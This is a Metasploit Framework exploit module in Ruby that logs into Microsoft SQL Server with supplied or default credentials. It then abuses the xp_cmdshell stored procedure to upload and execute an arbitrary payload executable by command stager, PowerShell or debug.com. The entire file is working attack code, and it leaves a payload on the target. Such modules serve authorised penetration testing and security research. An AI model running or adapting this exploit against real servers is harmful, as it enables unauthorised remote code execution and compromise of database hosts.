##
# $Id: mssql_payload.rb 11392 2010-12-21 20:36:34Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::MSSQL
	include Msf::Exploit::CmdStagerVBS
	#include Msf::Exploit::CmdStagerDebugAsm
	#include Msf::Exploit::CmdStagerDebugWrite
	#include Msf::Exploit::CmdStagerTFTP

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft SQL Server Payload Execution',
			'Description'    => %q{
					This module executes an arbitrary payload on a Microsoft SQL Server by using
				the "xp_cmdshell" stored procedure. Currently, three delivery methods are supported.

				First, the original method uses Windows 'debug.com'. File size restrictions are
				avoidied by incorporating the debug bypass method presented by SecureStat at
				Defcon 17. Since this method invokes ntvdm, it is not available on x86_64 systems.

				A second method takes advantage of the Command Stager subsystem. This allows using
				various techniques, such as using a TFTP server, to send the executable. By default
				the Command Stager uses 'wcsript.exe' to generate the executable on the target.

				Finally, ReL1K's latest method utilizes PowerShell to transmit and recreate the
				payload on the target.

				NOTE: This module will leave a payload executable on the target system when the
				attack is finished.
			},
			'Author'         =>
				[
					'David Kennedy "ReL1K" <kennedyd013[at]gmail.com>',  # original module, debug.exe method, powershell method
					'jduck'  # command stager mods
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 11392 $',
			'References'     =>
				[
					# 'sa' password in logs
					[ 'CVE', '2000-0402' ],
					[ 'OSVDB', '557' ],
					[ 'BID', '1281' ],

					# blank default 'sa' password
					[ 'CVE', '2000-1209' ],
					[ 'OSVDB', '15757' ],
					[ 'BID', '4797' ]
				],
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'May 30 2000'
			))
		register_options(
			[
				OptBool.new('VERBOSE', [ false, 'Enable verbose output', false ]),
				OptString.new('METHOD', [ true, 'Which payload delivery method to use (ps, cmd, or old)', 'cmd' ])
			])
	end

	# This is method required for the CmdStager to work...
	def execute_command(cmd, opts)
		mssql_xpcmdshell(cmd, datastore['VERBOSE'])
	end

	def exploit

		if (not mssql_login_datastore)
			print_status("Invalid SQL Server credentials")
			return
		end

		method = datastore['METHOD'].downcase
		
		if (method =~ /^cmd/)
			execute_cmdstager({ :linemax => 1500, :nodelete => true })
			#execute_cmdstager({ :linemax => 1500 })
		else
			# Generate the EXE, this is the same no matter what delivery mechanism we use
			exe = generate_payload_exe

			# Use powershell method for payload delivery if specified
			if (method =~ /^ps/) or (method =~ /^power/)
				powershell_upload_exec(exe)
			else
				# Otherwise, fall back to the old way..
				mssql_upload_exec(exe, datastore['VERBOSE'])
			end
		end

		handler
		disconnect
	end

end